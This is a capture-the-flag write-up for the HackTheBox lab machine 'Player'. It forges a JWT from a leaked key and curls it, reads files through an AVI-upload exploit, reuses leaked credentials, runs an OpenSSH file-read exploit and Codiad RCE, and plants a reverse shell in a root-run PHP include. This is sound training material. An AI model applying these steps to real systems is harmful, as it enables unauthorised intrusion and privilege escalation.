# Player - HackTheBox
## Linux - Hard

### Nmap
We have SSH and HTTP open on ports 22 and 80.

### HTTP
There is virtual hosting. By fuzzing, we find the following sites:
- player.htb/launcher
- dev.player.htb
- staging.player.htb
- chat.player.htb

The first one redirects us sometimes to `http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php` which itself redirects us to `index.html`. We can find the file by going to `http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~`:
```php
<?php
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))
{
    $key = '_S0_R@nd0m_P@ss_';
    $decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
    if($decoded->access_code === "0E76658526655756207688271159624026011393")
    {
        header("Location: 7F2xxxxxxxxxxxxx/");
    }
    else
    {
        header("Location: index.html");
    }
}
else
{
    $token_payload = [
      'project' => 'PlayBuff',
      'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
    ];
    $key = '_S0_R@nd0m_P@ss_';
    $jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
    $cookiename = 'access';
    setcookie('access',$jwt, time() + (86400 * 30), "/");
    header("Location: index.html");
}

?>
```
This allows us to get the JWT (using [jwt.io](jwt.io) for example): 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE
```
Then, using 
```bash
curl http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php -v -H "Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE"
``` 
we get the response
```
< HTTP/1.1 302 Found
< Date: Fri, 09 Aug 2019 13:34:06 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.26
< Location: 7F2dcsSdZo6nj3SNMTQ1/
< Content-Length: 0
< Content-Type: text/html
```
Going to `player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/` we get an upload page that compresses `avi` files. Going to `https://hackerone.com/reports/237381`, we get an exploit to read files on the box. By looking at some files in `/var/www/staging`, we get the file `/var/www/backup/service_config` using the command 
```bash 
python gen.py file:///var/www/backup/service_config lol.avi
```
This file discloses creds: `telegen:d-bC|jC!2uepS/w`.

### SSH
These creds don't work on SSH port 22. However, re-running `nmap` on all ports, we see that SSH also runs on port 6686. These creds work for that port, but we are in a restricted shell. 

The OpenSSH version is vulnerable to an exploit (`39569.py` on searchsploit). This exploit gives us arbitrary file read for user `telegen`.

We can get `user.txt` this way.

By looking at `/var/www/staging/fix.php`, we get other creds: `peter:CQXpm\z)G5D#%S$y=`.

### Codiad
These creds allows us to get access to `dev.player.htb`, which is the `Codiad` platform. We have RCE on this platform through `https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit`.

This gives us a shell as `www-data`.

### PrivEsc
We run `pspy64` on the box and see that root regularly runs `php /var/lib/playbuff/buff.php`:
```php
<?php
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
class playBuff
{
--- snip ---
?>
```

The second line is the most important since we can write `/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php`. Putting a reverse shell there gives us a root shell.
